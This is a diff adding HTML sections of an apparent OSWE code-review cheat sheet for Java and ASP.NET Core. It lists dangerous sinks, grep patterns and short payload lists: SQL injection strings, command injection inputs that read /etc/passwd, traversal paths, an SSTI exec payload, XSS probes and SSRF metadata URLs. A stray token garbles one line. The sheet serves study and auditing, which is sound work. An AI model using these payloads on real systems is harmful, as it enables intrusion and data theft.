+<li>Start with the sink: shell, eval, file write, template render, SQL, open, session/auth.</li>
+<li>Trace the user input backward.</li>
+<li>If the “fix” is only <code>trim()</code>, <code>toLowerCase()</code>, <code>replace()</code>, regex, or normalization, it is usually a rabbit hole unless it gates a real sink.</li>
+<li>Best OSWE clue: reflection + object binding + dynamic class loading + config + runtime globals.</li>
+</ul>
+</section>
+<section>
+<h3>Useful Search Terms</h3>
+<ul>
+<li><code>exec\(|ProcessBuilder|ScriptEngine|Class\.forName|reflect|invoke</code></li>
+<li><code>@RequestMapping|@GetMapping|doGet|doPost|web\.xml|Servlet</code></li>
+<li><code>readObject|ObjectInputStream|Serializable|yaml|enableDefaultTyping</code></li>
+<li><code>th:utext|JSP EL|Freemarker|Velocity|Template|\$\{|\$\{</code></li>
+<li><code>Files\.read|FileInputStream|Paths\.get|ZipFile|getResource</code></li>
+<li><code>Statement|createQuery|createNativeQuery|JdbcTemplate|ORDER BY|UNION|SELECT</code></li>
+<li><code>MultipartFile|transferTo|Files\.write|originalFilename|upload</code></li>
+<li><code>HttpSession|SecurityFilterChain|@PreAuthorize|jwt|Authorization|cookie</code></li>
+</ul>
+</section>
+<section>
+<h3>Payloads / Quick Reference</h3>
+<h4>RCE Checklist</h4>
+<ul>
+<li><code>Runtime.getRuntime().exec</code>, <code>ProcessBuilder</code>, <code>ScriptEngine</code>, <code>ELProcessor</code>, <code>Class.forName</code>, <code>Method.invoke</code></li>
+<li><code>bash -c</code>, <code>sh -c</code>, <code>cmd /c</code>, <code>powershell -Command</code>, <code>python -c</code></li>
+<li>params, cookies, headers, request body flowing into command strings or arrays</li>
+<li>user-controlled <code>cmd</code>, <code>command</code>, <code>script</code>, <code>clazz</code>, <code>method</code>, <code>path</code>, <code>filename</code>, <code>template</code></li>
+</ul>
+<h4>SQLi</h4>
+<ul>
+<li><code>&#x27; OR &#x27;1&#x27;=&#x27;1</code></li>
+<li><code>admin&#x27; --</code></li>
+<li><code>UNION SELECT NULL--</code></li>
+<li><code>ORDER BY 1--</code></li>
+</ul>
+<h4>Command Injection</h4>
+<ul>
+<li><code>; id;</code></li>
+<li><code>&amp;&amp; whoami</code></li>
+<li><code>| cat /etc/passwd</code></li>
+<li><code>$(id)</code></li>
+<li>`<code> </code>id<code> </code>`</li>
+<li><code>bash -c &#x27;id&#x27;</code></li>
+</ul>
+<h4>Traversal / File Reads</h4>
+<ul>
+<li><code>../../etc/passwd</code></li>
+<li><code>..\..\windows\win.ini</code></li>
+<li><code>%2e%2e%2fetc/passwd</code></li>
+<li><code>../secret.txt</code></li>
+</ul>
+<h4>Template Injection / SSTI</h4>
+<ul>
+<li><code>${7*7}</code></li>
+<li><code>${T(java.lang.Runtime).getRuntime().exec(&#x27;id&#x27;)}</code></li>
+<li><code>${{7*7}}</code></li>
+<li><code>{{7*7}}</code></li>
+<li><code>#{7*7}</code></li>
+</ul>
+<h4>XSS / HTML Injection</h4>
+<ul>
+<li><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
+<li><code>&lt;img src=x onerror=alert(1)&gt;</code></li>
+<li><code>&quot;&gt;&lt;svg/onload=alert(1)&gt;</code></li>
+<li><code>javascript:alert(1)</code></li>
+</ul>
+<h4>Deserialization / Object Abuse</h4>
+<ul>
+<li><code>serialVersionUID</code> / Java serialized gadget chains</li>
+<li><code>ObjectInputStream.readObject()</code> on untrusted input</li>
+<li>YAML/JSON polymorphic payloads with <code>enableDefaultTyping</code> or <code>@TypeInfo</code></li>
+<li><code>readObject</code>, <code>readResolve</code>, <code>Externalizable</code></li>
+</ul>
+<h4>SSRF</h4>
+<ul>
+<li><code>http://127.0.0.1:22</code></li>
+<li><code>http://localhost/admin</code></li>
+<li><code>http://169.254.169.254/latest/meta-data/</code></li>
+<li><code>file:///etc/passwd</code></li>
+</ul>
+</section>
+<section>
+<h3>Final rule</h3>
+<ul>
+<li>identify the framework first</li>
+<li>identify the template engine second</li>
+<li>then identify the real sink</li>
+<li>only after that do you chase input flows and payloads</li>
+</ul>
+</section>
+</details>
+<details open>
+<summary id="net-asp-net-core-subtopic-notes"><h2>7. .NET / ASP.NET Core Notes</h2></summary>
+<section>
+<h3>Scope</h3>
+<ul>
+<li>.NET web-app review centered on ASP.NET Core, with MVC, Razor, Blazor, SignalR, and Entity Framework coverage</li>
+</ul>
+</section>
+<section>
+<h3>7.0. Identify the Stack</h3>
+<ul>
+<li>ASP.NET Core Minimal API: <code>WebApplication</code>, <code>app.MapGet</code>, <code>app.MapPost</code>, <code>app.MapPut</code>, <code>app.MapDelete</code>, <code>app.MapGroup</code>, <code>app.Use</code>, <code>app.UseRouting</code>, <code>app.UseEndpoints</code></li>
+<li>ASP.NET Core MVC: <code>Controller</code>, <code>ControllerBase</code>, <code>ApiController</code>, <code>Route</code>, <code>HttpGet</code>, <code>HttpPost</code>, <code>FromQuery</code>, <code>FromRoute</code>, <code>FromBody</code>, <code>ActionResult&lt;T&gt;</code>, <code>IActionResult</code></li>
+<li>Razor Pages: <code>PageModel</code>, <code>OnGet</code>, <code>OnPost</code>, <code>OnGetAsync</code>, <code>OnPostAsync</code>, <code>BindProperty</code>, <code>PageResult</code></li>
+<li>Blazor: <code>@page</code>, <code>@code</code>, <code>@bind</code>, <code>@onclick</code>, <code>EventCallback</code>, <code>HttpClient</code>, <code>EditForm</code></li>
+<li>SignalR: <code>Hub</code>, <code>Hub&lt;T&gt;</code>, <code>MapHub&lt;...&gt;</code>, <code>IHubContext&lt;T&gt;</code>, <code>Clients.All</code></li>
+<li>Entity Framework Core: <code>DbContext</code>, <code>DbSet&lt;T&gt;</code>, <code>FromSqlRaw</code>, <code>ExecuteSqlRaw</code>, <code>SaveChanges</code>, <code>LINQ</code></li>
+<li>Raw ASP.NET / old .NET: <code>HttpApplication</code>, <code>HttpHandler</code>, <code>HttpModule</code>, <code>Page</code>, <code>WebMethod</code>, <code>Server.Execute</code></li>
+</ul>
+</section>
+<section>
+<h3>7.1. Identify the Template Engine</h3>
+<ul>
+<li>Razor: <code>@model</code>, <code>@Html.Raw</code>, <code>@Html.Encode</code>, <code>@foreach</code>, <code>@if</code>, <code>@page</code>, <code>@Url.Action</code>, <code>@using</code></li>
+<li>MVC Views: <code>.cshtml</code>, <code>ViewBag</code>, <code>ViewData</code>, <code>TempData</code>, <code>Model</code></li>
+<li>Blazor Components: <code>@bind</code>, <code>@onclick</code>, <code>@for</code>, <code>@if</code>, <code>@code</code>, <code>MarkupString</code></li>
+<li>custom templates: <code>TemplateEngine</code>, <code>RazorViewEngine</code>, <code>Handlebars</code>, <code>Mustache</code>, <code>Jinja</code> in .NET wrappers</li>
+<li>if user input reaches server-side rendering or template output, inspect for SSTI / XSS</li>
+</ul>
+</section>
+<section>
+<h3>7.2. The 10 Patterns to Check First</h3>
+<ul>
+<li>Route Precedence and Generic-vs-Specific Confusion: <code>MapGet</code>, <code>MapPost</code>, <code>MapPut</code>, <code>MapDelete</code>, <code>MapGroup</code>, <code>Route</code>, <code>HttpGet</code>, <code>HttpPost</code>, <code>UseRouting</code>, <code>UseEndpoints</code></li>
+<li>Command Injection: <code>Process.Start</code>, <code>System.Diagnostics.Process</code>, <code>ProcessStartInfo</code>, <code>Command</code>, <code>UseShellExecute</code>, <code>bash -c</code>, <code>cmd /c</code>, <code>powershell -Command</code></li>
+<li>Code Execution / Dynamic Compilation: <code>CSharpCodeProvider</code>, <code>CodeDomProvider</code>, <code>Microsoft.CSharp</code>, <code>ScriptEngine</code>, <code>Roslyn</code>, <code>CompileAssemblyFromSource</code></li>
+<li>Insecure Deserialization: <code>BinaryFormatter</code>, <code>SoapFormatter</code>, <code>LosFormatter</code>, <code>NetDataContractSerializer</code>, <code>ObjectStateFormatter</code>, <code>yaml.load</code>, <code>TypeNameHandling.All</code></li>
+<li>XSS / HTML Injection: <code>@Html.Raw</code>, <code>MarkupString</code>, <code>HttpUtility.HtmlDecode</code>, <code>HtmlString</code>, <code>ViewBag</code>, <code>TempData</code>, <code>Model</code></li>
+<li>File Upload / Write Abuse: <code>IFormFile</code>, <code>FormFile</code>, <code>Request.Form.Files</code>, <code>FileStream</code>, <code>File.WriteAllBytes</code>, <code>File.Copy</code>, <code>File.Move</code>, <	code<|fim_middle|>
+<li>Object Hydration / Parameter Binding Abuse: <code>Request.Query</code>, <code>Request.Form</code>, <code>Request.Headers</code>, <code>HttpContext</code>, <code>Session</code>, <code>TempData</code>, <code>ViewData</code></li>
+<li>Config / State Mutation / Auth Confusion: <code>JsonSerializer.Deserialize</code>, <code>HttpContext.Items</code>, <code>Session</code>, <code>AuthenticationState</code>, <code>ClaimsPrincipal</code>, <code>IOptions&lt;T&gt;</code></li>
+</ul>
+</section>
+<section>
+<h3>7.3. Routing</h3>
+<ul>
+<li>Minimal API: <code>app.MapGet</code>, <code>app.MapPost</code>, <code>app.MapPut</code>, <code>app.MapDelete</code>, <code>app.MapGroup</code>, <code>app.MapControllers</code></li>
+<li>MVC: <code>[Route]</code>, <code>[HttpGet]</code>, <code>[HttpPost]</code>, <code>[HttpPut]</code>, <code>[HttpDelete]</code>, <code>[Route(&quot;{id:int}&quot;)]</code></li>
+<li>Razor Pages: <code>@page &quot;/x/{id}&quot;</code>, <code>OnGet</code>, <code>OnPost</code>, handler methods</li>
+<li>Safe rule: specific before generic; generic before specific = danger</li>
+<li>Check middleware order: auth → validation → upload → business logic → response rendering</li>
+<li>Search for: <code>MapGet</code>, <code>MapPost</code>, <code>Route</code>, <code>HttpGet</code>, <code>UseRouting</code>, <code>UseEndpoints</code>, <code>UseAuthorization</code></li>
+</ul>
+</section>
+<section>
+<h3>7.4. Code Execution</h3>
+<ul>
+<li><code>Process.Start(...)</code>, <code>ProcessStartInfo</code>, <code>System.Diagnostics.Process</code></li>
+<li><code>CSharpCodeProvider</code>, <code>CodeDomProvider</code>, <code>Microsoft.CSharp</code>, <code>Assembly.Load</code>, <code>Activator.CreateInstance</code></li>
+<li><code>ScriptEngine</code>, <code>dynamic</code> and reflection-based loading of classes from user-controlled names</li>
+<li><code>Type.GetType</code>, <code>Assembly.Load</code>, <code>Activator.CreateInstance</code>, <code>MethodInfo.Invoke</code></li>
+<li><code>Razor</code> / <code>Template</code> use with user input flowing into <code>@Html.Raw</code>, <code>MarkupString</code>, or dynamic compilation paths</li>
+<li>search for: <code>Process.Start</code>, <code>ProcessStartInfo</code>, <code>Assembly.Load</code>, <code>Activator</code>, <code>MethodInfo</code>, <code>CSharpCodeProvider</code>, <code>CodeDom</code></li>
+</ul>
+<h4>4.1. .NET RCE patterns</h4>
+<ul>
+<li><code>Process.Start(new ProcessStartInfo(&quot;bash&quot;, &quot;-c &quot; + request.Query[&quot;cmd&quot;]))</code></li>
+<li><code>Process.Start(&quot;powershell&quot;, &quot;-Command &quot; + req.Query[&quot;cmd&quot;])</code></li>
+<li><code>Assembly.Load(...)</code> with user-controlled assembly or type names</li>
+<li><code>Type.GetType(request.Query[&quot;type&quot;])</code></li>
+<li><code>Activator.CreateInstance(Type.GetType(...))</code></li>
+<li><code>MethodInfo.Invoke(...)</code> with input-controlled method names</li>
+<li><code>CSharpCodeProvider</code> / dynamic source processing from request input</li>
+</ul>
+<h4>4.2. High-value sinks / file names</h4>
+<ul>
+<li><code>Process.cs</code>, <code>Command.cs</code>, <code>Shell.cs</code>, <code>Exec.cs</code>, <code>Runtime.cs</code>, <code>Loader.cs</code>, <code>Reflection.cs</code></li>
+<li><code>cmd</code>, <code>command</code>, <code>shell</code>, <code>process</code>, <code>args</code>, <code>filename</code>, <code>path</code>, <code>assembly</code>, <code>type</code>, <code>method</code>, <code>script</code></li>
+<li><code>ProcessStartInfo</code>, <code>Process</code>, <code>Assembly.Load</code>, <code>Activator</code>, <code>MethodInfo</code>, <code>Type.GetType</code></li>
+</ul>
+<h4>4.3. What to do when you find it</h4>
+<ul>
+<li>Confirm user input reaches a process start, assembly load, reflection call, or dynamic compiler</li>
+<li>Check whether the command is built from query/form/cookie/header data</li>
+<li>Confirm it is reachable from an HTTP route, page, or worker job</li>
+<li>Determine impact: file read, command execution, persistence, lateral movement</li>
+</ul>
+</section>
+<section>
+<h3>7.5. Command Injection</h3>
+<ul>
+<li><code>Process.Start</code>, <code>ProcessStartInfo</code>, <code>UseShellExecute</code>, <code>WorkingDirectory</code>, <code>Arguments</code></li>
+<li><code>bash -c</code>, <code>sh -c</code>, <code>cmd /c</code>, <code>powershell -Command</code>, <code>pwsh -Command</code></li>
+<li>user input into <code>cmd</code>, <code>command</code>, <code>args</code>, <code>filename</code>, <code>path</code>, <code>script</code>, <code>processName</code></li>
+<li>search for: <code>Process.Start</code>, <code>ProcessStartInfo</code>, <code>UseShellExecute</code>, <code>bash -c</code>, <code>cmd /c</code>, <code>powershell</code></li>
+</ul>
+</section>
+<section>
+<h3>7.6. Insecure Deserialization</h3>
+<ul>
+<li><code>BinaryFormatter</code>, <code>SoapFormatter</code>, <code>LosFormatter</code>, <code>NetDataContractSerializer</code>, <code>ObjectStateFormatter</code></li>
+<li><code>TypeNameHandling.All</code> in <code>Newtonsoft.Json</code>, polymorphic payloads in JSON / XML messages</li>
+<li><code>XmlSerializer</code> + unsafe object graphs, <code>DataContractSerializer</code> with user-controlled types</li>
+<li><code>JavaScriptSerializer</code> / custom <code>ConvertFrom</code> is not a fix if type info is enabled upstream</li>
+<li>search for: <code>BinaryFormatter</code>, <code>SoapFormatter</code>, <code>readObject</code>, <code>Deserialize</code>, <code>TypeNameHandling</code>, <code>JsonConvert</code></li>
+</ul>
+</section>
+<section>
+<h3>7.7. Templates / SSTI</h3>
+<ul>
+<li>Razor: <code>@Html.Raw</code>, <code>@((MarkupString)...)</code>, <code>@model</code>, <code>@ViewBag</code>, <code>@TempData</code>, <code>@Html</code> output</li>
+<li>Blazor: <code>@bind</code>, <code>@onclick</code>, <code>@code</code>, <code>RenderFragment</code>, dynamic rendering</li>
+<li>MVC Views / Razor Pages: model values printed directly into HTML without encoding</li>
+<li>route → controller/page → view → user input</li>
+<li>XSS / SSTI risk often appears when output is raw HTML or markup strings</li>
+</ul>
+</section>
+<section>
+<h3>7.8. XSS</h3>
+<ul>
+<li><code>@Html.Raw</code>, <code>MarkupString</code>, raw <code>Response.Write</code>, <code>HttpResponse.Write</code>, custom HTML response builders</li>
+<li>MVC / Razor returning strings or models into HTML views without encoding</li>
+<li>query / form / headers / cookies / route values reflected into HTML</li>
+<li>antiXss / <code>HtmlEncoder.Default.Encode(...)</code> should be used when output is untrusted</li>
+<li>search for: <code>Html.Raw</code>, <code>MarkupString</code>, <code>Response.Write</code>, <code>WriteAsync</code>, <code>ViewBag</code>, <code>TempData</code>, <code>Model</code></li>
+</ul>
+</section>
+<section>
+<h3>7.9. File Upload</h3>
+<ul>
+<li><code>IFormFile</code>, <code>FormFile</code>, <code>Request.Form.Files</code>, <code>FileStream</code>, <code>File.WriteAllBytes</code>, <code>File.WriteAllText</code>, <code>StreamWriter</code></li>
+<li><code>Path.Combine</code>, <code>Request.Path</code>, <code>UploadPath</code>, <code>SaveAs</code>, <code>OpenWrite</code>, <code>File.Move</code></li>
+<li>extension allowlist / blacklist bypass</li>
+<li>traversal via upload dir + user filename: <code>../</code>, <code>%2e%2e</code>, <code>..%2f</code>, symlinked upload dirs</li>
+<li>web shell patterns: <code>.cshtml</code>, <code>.aspx</code>, <code>.jsp</code>, <code>.html</code>, <code>.js</code>, <code>.php</code>, <code>.aspx</code>, <code>.ashx</code>, <code>.cs</code>, <code>.dll</code></li>
+<li>search for: <code>IFormFile</code>, <code>FileStream</code>, <code>SaveAs</code>, <code>Upload</code>, <code>Path.Combine</code>, <code>Request.Form.Files</code></li>
+</ul>
+</section>
+<section>
+<h3>7.10. SQLi</h3>
+<ul>
+<li><code>DbContext</code>, <code>Database.ExecuteSqlRaw</code>, <code>FromSqlRaw</code>, <code>SqlCommand</code>, <code>SqlDataAdapter</code>, <code>ExecuteReader</code></li>
+<li>string concatenation with LINQ/SQL, interpolation in raw SQL, <code>.FromSqlInterpolated</code>, <code>.FromSqlRaw</code></li>
+<li><code>SELECT</code>, <code>WHERE</code>, <code>ORDER BY</code>, <code>LIMIT</code>, <code>UNION</code>, <code>--</code>, <code>OR 1=1</code>, <code>&#x27; OR &#x27;1&#x27;=&#x27;1</code></li>
+<li>if user input reaches <code>WHERE</code>, <code>ORDER BY</code>, <code>OFFSET</code>, or dynamic SQL, inspect closely</li>
+<li>search for: <code>ExecuteSqlRaw</code>, <code>FromSqlRaw</code>, <code>SqlCommand</code>, <code>OrderBy</code>, <code>Union</code>, <code>RawSql</code></li>
+</ul>
+</section>
+<section>
+<h3>7.11. Directory Traversal</h3>
+<ul>
+<li><code>File.ReadAllText</code>, <code>File.OpenRead</code>, <code>File.ReadAllBytes</code>, <code>Path.Combine</code>, <code>PhysicalFileProvider</code>, <code>IWebHostEnvironment</code></li>
+<li><code>../</code>, <code>..\</code>, <code>%2e%2e</code>, <code>%2f</code>, <code>..%2f</code></li>
+<li>file reads from uploads, templates, logs, configs, caches, temp files</li>
+<li><code>Path.GetFullPath</code>, <code>Path.GetDirectoryName</code>, <code>FileInfo.FullName</code> help only if paired with an allowlist / root enforcement</li>
+<li>zip slip: <code>ZipArchive</code>, <code>ZipFile</code>, <code>ExtractToDirectory</code>, <code>ZipArchiveEntry</code></li>
+<li>search for: <code>ReadAllText</code>, <code>OpenRead</code>, <code>PhysicalFileProvider</code>, <code>Path.Combine</code>, <code>ZipArchive</code>, <code>ExtractToDirectory</code></li>
+</ul>
+</section>
+<section>
+<h3>7.12. Property Binding / Object Mutation</h3>
+<ul>
+<li><code>Request.Query</code>, <code>Request.Form</code>, <code>FromQuery</code>, <code>FromBody</code>, <code>BindProperty</code>, <code>ModelBinding</code>, <code>JsonSerializer.Deserialize</code></li>
+<li>user-controlled keys mutating roles, permissions, admin flags, config, DTOs, view models</li>
+<li><code>HttpContext.Items</code>, <code>Session</code>, <code>ClaimsPrincipal</code>, <code>TempData</code>, <code>ViewData</code>, <code>HttpContext.User</code></li>
+<li>patching imported framework or library internals after load</li>
+<li>search for: <code>BindProperty</code>, <code>FromBody</code>, <code>Deserialize</code>, <code>Request.Form</code>, <code>Session</code>, <code>ClaimsPrincipal</code>, <code>ViewData</code></li>
+</ul>
+</section>
+<section>
+<h3>7.13. Auth / Session</h3>
+<ul>
+<li><code>HttpContext.Session</code>, <code>CookieAuthentication</code>, <code>AddAuthentication</code>, <code>AddAuthorization</code>, <code>Authorize</code>, <code>RequireAuthorization</code></li>
+<li><code>ClaimsPrincipal</code>, <code>ClaimTypes</code>, <code>User.IsInRole</code>, <code>IsAuthenticated</code>, <code>AuthorizeAttribute</code>, <code>[Authorize]</code>, <code>[AllowAnonymous]</code></li>
+<li><code>UseAuthentication</code>, <code>UseAuthorization</code>, <code>CookiePolicyOptions</code>, <code>HttpOnly</code>, <code>Secure</code>, <code>SameSite</code>, <code>SessionState</code></li>
+<li><code>JwtBearer</code>, <code>AddJwtBearer</code>, <code>token</code>, <code>bearer</code>, <code>Authorization</code> header</li>
+<li>search for: <code>Session</code>, <code>Cookie</code>, <code>Authentication</code>, <code>Authorization</code>, <code>JwtBearer</code>, <code>ClaimsPrincipal</code>, <code>Authorize</code></li>
+</ul>
+</section>
+<section>
+<h3>7.14. SSRF</h3>
+<ul>
+<li><code>HttpClient</code>, <code>HttpClientHandler</code>, <code>WebClient</code>, <code>RestClient</code>, <code>HttpRequestMessage</code>, <code>Uri</code></li>
+<li><code>AllowAutoRedirect</code>, <code>UseProxy</code>, <code>CookieContainer</code>, <code>BaseAddress</code>, <code>RequestUri</code>, <code>HttpClientFactory</code></li>
+<li>internal IP / localhost checks: <code>127.0.0.1</code>, <code>localhost</code>, <code>10.0.0.0/8</code>, <code>172.16/12</code>, <code>192.168/16</code>, <code>169.254.169.254</code></li>
+<li>search for: <code>HttpClient</code>, <code>WebClient</code>, <code>Uri</code>, <code>RequestUri</code>, <code>BaseAddress</code>, <code>localhost</code>, <code>internal</code></li>
+</ul>
+</section>
+<section>
+<h3>7.15. XML / XXE</h3>
+<ul>
+<li><code>XmlDocument</code>, <code>XmlReader</code>, <code>XPathDocument</code>, <code>XDocument</code>, <code>XmlSerializer</code>, <code>XmlTextReader</code>, <code>XmlReaderSettings</code></li>
+<li><code>DOCTYPE</code>, <code>ENTITY</code>, <code>SYSTEM</code>, <code>PUBLIC</code>, <code>DtdProcessing</code></li>
+<li>search for: <code>XmlReader</code>, <code>XmlDocument</code>, <code>XDocument</code>, <code>DOCTYPE</code>, <code>ENTITY</code>, <code>SYSTEM</code>, <code>DtdProcessing</code></li>
+</ul>
+</section>
+<section>
+<h3>7.16. Mass Assignment / Object Hydration</h3>
+<ul>
+<li><code>JsonSerializer.Deserialize&lt;T&gt;(...)</code>, <code>BindModel</code>, <code>ModelBinding</code>, <code>FormValueProvider</code>, <code>TryUpdateModelAsync</code></li>
+<li><code>new User {...}</code>, <code>DTO</code>, <code>view model</code>, <code>Request.Form.ToDictionary</code>, <code>Cookies</code>, <code>QueryString</code></li>
+<li><code>TypeDescriptor</code>, <code>PropertyInfo.SetValue</code>, <code>Activator.CreateInstance</code>, <code>reflection</code> on request-bound objects</li>
+<li>search for: <code>Deserialize</code>, <code>BindProperty</code>, <code>TryUpdateModelAsync</code>, <code>Request.Form</code>, <code>ModelBinding</code>, <code>PropertyInfo</code></li>
+</ul>
+</section>
+<section>
+<h3>7.17. Rabbit Holes</h3>
+<ul>
+<li><code>Trim()</code>, <code>ToLower()</code>, <code>Replace()</code>, <code>Substring()</code>, <code>Split()</code>, <code>Contains()</code>, <code>IndexOf()</code></li>
+<li><code>Random.Shared</code>, <code>Guid.NewGuid()</code>, <code>SHA256.Create()</code>, <code>MD5.Create()</code>, <code>PBKDF2</code></li>
+<li><code>Regex.Match</code>, <code>Regex.IsMatch</code>, <code>Regex.Replace</code>, <code>Path.GetFullPath</code>, <code>Uri.TryCreate</code></li>
+<li>these are usually not bugs by themselves; they matter only if they gate a real sink</li>
+<li>if it never reaches a sink, move on</li>
+</ul>
+</section>
+<section>
+<h3>7.18. KPI’s / High-Value Files</h3>
+<ul>
+<li><code>Program.cs</code>, <code>Startup.cs</code>, <code>appsettings.json</code>, <code>appsettings.Development.json</code>, <code>launchSettings.json</code>, <code>web.config</code></li>
+<li><code>Program.cs</code> with <code>builder.Services</code>, <code>AddAuthentication</code>, <code>AddAuthorization</code>, <code>AddDbContext</code>, <code>AddControllers</code>, <code>UseRouting</code></li>
+<li><code>Controllers/</code>, <code>Pages/</code>, <code>Models/</code>, <code>Services/</code>, <code>Data/</code>, <code>Migrations/</code></li>
+<li><code>Configuration</code>, <code>IConfiguration</code>, <code>Environment.GetEnvironmentVariable</code>, <code>builder.Configuration</code>, <code>appsettings</code></li>
+<li><code>HttpClient</code>, <code>DbContext</code>, <code>Process.Start</code>, <code>Assembly.Load</code>, <code>JsonSerializer</code>, <code>Authentication</code>, <code>Authorization</code></li>
+</ul>
+</section>
+<section>
+<h3>7.19. The Missing .NET Edge Cases (The Final 5%)</h3>
+<h4>19.1. Mass Assignment via <code>[AsParameters]</code> (Minimal APIs)</h4>
+<ul>
+<li><strong>Mechanics:</strong> Modern .NET Minimal APIs rely heavily on <code>[AsParameters]</code> to map incoming HTTP query strings, route values, or form fields directly into a custom record type or data structure. If that target record maps directly to an underlying database entity or internal system configuration, an attacker can over-post parameters to alter unlisted properties.</li>
+<li><strong>High-Value Sinks:</strong> <code>[AsParameters]</code>, <code>HttpContext.Request.AsParameters</code> mappings.</li>
+<li><strong>Search Grep:</strong> <code>\[AsParameters\]</code></li>
+</ul>
+<h4>19.2. Mass Assignment via JSON Source Generators</h4>
+<ul>
+<li><strong>Mechanics:</strong> High-performance or Native AOT (Ahead-of-Time) compilation pathways utilize <code>[JsonSerializable]</code> contexts for serialization. If a structural data type is registered this way, standard reflection-based filters or runtime security middleware might fail to intercept how deep properties are bound, opening subtle mutation routes during payload deserialization.</li>
+<li><strong>High-Value Sinks:</strong> <code>[JsonSerializable]</code>, <code>JsonSerializerContext</code>, <code>JsonSerializerOptions.TypeInfoResolver</code>.</li>
+<li><strong>Search Grep:</strong> <code>\[JsonSerializable</code></li>
+</ul>
+<h4>19.3. SSRF via GraphQL / HotChocolate Framework</h4>
+<ul>
+<li><strong>Mechanics:</strong> Enterprise applications often replace basic <code>HttpClient</code> patterns with GraphQL engines. Look for <code>@stream</code> directives, schema stitching, or dynamic client endpoints where user input can manipulate downstream queries, prompting the host server to fetch unintended internal endpoints or cloud metadata layouts.</li>
+<li><strong>High-Value Sinks:</strong> <code>HotChocolate</code>, <code>AddGraphQLServer</code>, <code>StitchSchema</code>, <code>@stream</code>.</li>
+<li><strong>Search Grep:</strong> <code>HotChocolate</code> | <code>AddGraphQLServer</code></li>
+</ul>
+<h4>19.4. XML External Entity (XXE) via Legacy <code>DataContractSerializer</code></h4>
+<ul>
+<li><strong>Mechanics:</strong> While default <code>XmlReader</code> instances are safe in modern .NET, standard <code>System.Runtime.Serialization.DataContractSerializer</code> processes can be coerced into evaluating external entities if they are passed a custom <code>XmlDictionaryReader</code> that explicitly enables relaxed security properties or insecure resolvers for backward compatibility.</li>
+<li><strong>High-Value Sinks:</strong> <code>DataContractSerializer</code>, <code>XmlDictionaryReader.CreateTextReader</code>, <code>XmlDictionaryReader.CreateMtomReader</code>.</li>
+<li><strong>Search Grep:</strong> <code>DataContractSerializer</code> | <code>XmlDictionaryReader</code></li>
+</ul>
+<h4>19.5. Authorization Bypass via Route Constraint Confusion</h4>
+<ul>
+<li><strong>Mechanics:</strong> .NET evaluates API routes very strictly (e.g., <code>[HttpGet(&quot;admin/{id:int}&quot;)]</code>). If your authentication or gateway middleware filters access by checking if the path raw string simply starts with <code>/admin/</code>, an attacker appending extra slashes, path traversal parameters, or taking advantage of encoding differences between a reverse proxy (like Nginx) and Kestrel can bypass global authorization logic while still hitting the target action.</li>
+<li><strong>High-Value Sinks:</strong> <code>[Route]</code>, <code>[HttpGet]</code>, <code>UseAuthorization</code> misplacements relative to custom endpoints.</li>
+<li><strong>Search Grep:</strong> <code>Route\(</code> | <code>UseAuthorization</code></li>
+</ul>
+</section>
+<section>
+<h3>Quick Review Rule</h3>
+<ul>
+<li>Start with the sink: shell, file write, template render, SQL, open, session/auth.</li>
+<li>Trace the user input backward.</li>
+<li>If the “fix” is only <code>Trim()</code>, <code>ToLower()</code>, <code>Replace()</code>, regex, or normalization, it is usually a rabbit hole unless it gates a real sink.</li>
+<li>Best OSWE clue: reflection + object binding + dynamic assembly loading + config + runtime state.</li>
+</ul>
+</section>
+<section>
+<h3>Useful Search Terms</h3>
+<ul>
+<li><code>Process\.Start|ProcessStartInfo|UseShellExecute|cmd /c|powershell|bash -c</code></li>
+<li><code>MapGet|MapPost|Route\(|HttpGet|HttpPost|UseRouting|UseEndpoints</code></li>
+<li><code>BinaryFormatter|SoapFormatter|TypeNameHandling|JsonConvert|Deserialize</code></li>
+<li><code>@Html\.Raw|MarkupString|Response\.Write|ViewBag|TempData|Model</code></li>
+<li><code>IFormFile|FileStream|WriteAllBytes|Path\.Combine|Request\.Form\.Files|Upload</code></li>
+<li><code>ExecuteSqlRaw|FromSqlRaw|SqlCommand|OrderBy|Union|SELECT</code></li>
+<li><code>File\.ReadAll|OpenRead|PhysicalFileProvider|ZipArchive|ExtractToDirectory</code></li>
+<li><code>Session|ClaimsPrincipal|Authorize|JwtBearer|Authentication|Authorization</code></li>
+</ul>
+</section>
+<section>
+<h3>Payloads / Quick Reference</h3>
+<h4>RCE Checklist</h4>
+<ul>
+<li><code>Process.Start</code>, <code>ProcessStartInfo</code>, <code>Assembly.Load</code>, <code>Activator.CreateInstance</code>, <code>MethodInfo.Invoke</code>, <code>CSharpCodeProvider</code></li>
+<li><code>bash -c</code>, <code>sh -c</code>, <code>cmd /c</code>, <code>powershell -Command</code>, <code>pwsh -Command</code></li>
+<li>query, form, cookie, header, body values flowing into command or reflection strings</li>
+<li>user-controlled <code>cmd</code>, <code>command</code>, <code>args</code>, <code>path</code>, <code>filename</code>, <code>type</code>, <code>method</code>, <code>assembly</code>, <code>script</code></li>
+</ul>
+<h4>SQLi</h4>
+<ul>
+<li><code>&#x27; OR &#x27;1&#x27;=&#x27;1</code></li>
+<li><code>admin&#x27; --</code></li>
+<li><code>UNION SELECT NULL--</code></li>
+<li><code>ORDER BY 1--</code></li>
+</ul>
+<h4>Command Injection</h4>
+<ul>
+<li><code>; id;</code></li>
+<li><code>&amp;&amp; whoami</code></li>
+<li><code>| cat /etc/passwd</code></li>
+<li><code>$(id)</code></li>
+<li>`<code> </code>id<code> </code>`</li>
+<li><code>bash -c &#x27;id&#x27;</code></li>
+</ul>
+<h4>Traversal / File Reads</h4>
+<ul>
+<li><code>../../etc/passwd</code></li>
+<li><code>..\..\windows\win.ini</code></li>
+<li><code>%2e%2e%2fetc/passwd</code></li>
+<li><code>../secret.txt</code></li>
+</ul>
+<h4>Template Injection / XSS</h4>
+<ul>
+<li><code>${7*7}</code></li>
+<li><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
+<li><code>&lt;img src=x onerror=alert(1)&gt;</code></li>
+<li><code>&quot;&gt;&lt;svg/onload=alert(1)&gt;</code></li>
+<li><code>javascript:alert(1)</code></li>
+</ul>
+<h4>Deserialization / Object Abuse</h4>
+<ul>
+<li><code>BinaryFormatter</code> on untrusted input</li>
+<li><code>SoapFormatter</code> / <code>LosFormatter</code> / <code>NetDataContractSerializer</code></li>
+<li>JSON polymorphism with <code>TypeNameHandling.All</code></li>
+<li><code>JsonSerializer.Deserialize</code> with user-controlled type metadata</li>
+</ul>
+<h4>SSRF</h4>
+<ul>
